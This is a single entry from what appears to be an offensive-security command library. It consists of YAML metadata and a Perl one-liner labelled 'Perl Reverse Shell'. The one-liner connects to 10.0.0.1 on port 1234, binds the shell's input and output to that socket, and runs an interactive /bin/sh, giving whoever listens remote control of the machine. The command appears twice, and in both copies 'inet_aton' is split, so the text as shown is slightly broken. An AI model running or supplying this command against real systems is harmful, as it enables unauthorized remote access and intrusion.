---
id: e9ca6b87-5d77-4554-8a3b-939684aa2776
name: Perl Reverse Shell
type: command
executor: null
data: perl -e 'use Socket;$i="10.0.0.1"; $p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_at
  on($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh
  -i");};'
output: null
created_at: '2019-09-17T20:45:42.998477+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Perl Reverse Shell

```bash
perl -e 'use Socket;$i="10.0.0.1"; $p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_at on($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```


